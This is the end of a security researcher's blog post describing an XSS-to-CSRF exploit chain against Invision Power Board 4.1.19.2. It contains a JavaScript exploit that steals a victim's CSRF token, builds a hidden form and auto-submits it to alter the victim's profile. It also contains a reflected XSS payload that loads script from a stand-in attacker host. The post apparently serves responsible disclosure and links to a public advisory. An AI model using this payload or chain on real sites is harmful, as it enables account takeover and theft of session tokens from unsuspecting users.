<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="enable_status_updates_checkbox" value="1"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="core_pfield_1" value="'</span> <span class="o">+</span> <span class="nx">payload</span> <span class="o">+</span> <span class="s1">'"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;input type="hidden" name="core_pfield_1_upload" value="sxcurity"&gt;'</span>
<span class="o">+</span> <span class="s1">'&lt;/form&gt;'</span><span class="p">;</span>

<span class="c1">// submits our csrf form!</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="s2">"woot"</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>

<span class="kd">function</span> <span class="kd">get</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xmlHttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
    <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">xmlHttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This javascript steals the victim’s CSRF token, builds a CSRF form &amp; submits it, enables the user’s status updates in order to change their “About Me” bio to “sxcurity is my hero” (shout out to Samy Kamkar for the inspiration!)<br /><br />
Payload:  <code class="highlighter-rouge">controller='};&lt;/script&gt;&lt;script src=//&lt;attacker&gt;/lol.js&gt;&lt;/script&gt;;{'</code><br />
<br /><br />
Needless to say, I had a ton of fun weaponizing this reflected XSS and abusing the HTML option in the Announcements! It was definitely a great learning experience as well. Read the full advisory <a href="https://packetstormsecurity.com/files/142937/Invision-Power-Board-4.1.19.2-XSS-CSRF-File-Upload-Disclosure.html" style="color:#E22A3C">here</a>.
<br /><br />
Thanks for reading,<br /><br />
<strong>Corben Douglas</strong> (<font color="#E22A3C">@sxcurity</font>)</p>
<ul>
  <li>https://hackerone.com/cdl</li>
  <li>https://twitter.com/sxcurity</li>
  <li>https://bugcrowd.com/c</li>
  <li>https://github.com/sxcurity</li>
</ul>


        </div>
        
      </li>
    
  </ul>

  
  <div class="pagination">
    
      <a class="previous" href="/posts/2/">&laquo; Older</a>
    

    
  </div>



</div>

      </div>
    </main>

    <footer class="site-footer">

  <div class="wrapper">

    <p>
      

&copy; Corben Douglas - Twitter: <a href="https://twitter.com/sxcurity">@sxcurity</a> - Subscribe via <a href="http://hack-r.be:4000/feed.xml">RSS</a>

    </p>

  </div>

</footer>


  </body>

</html>
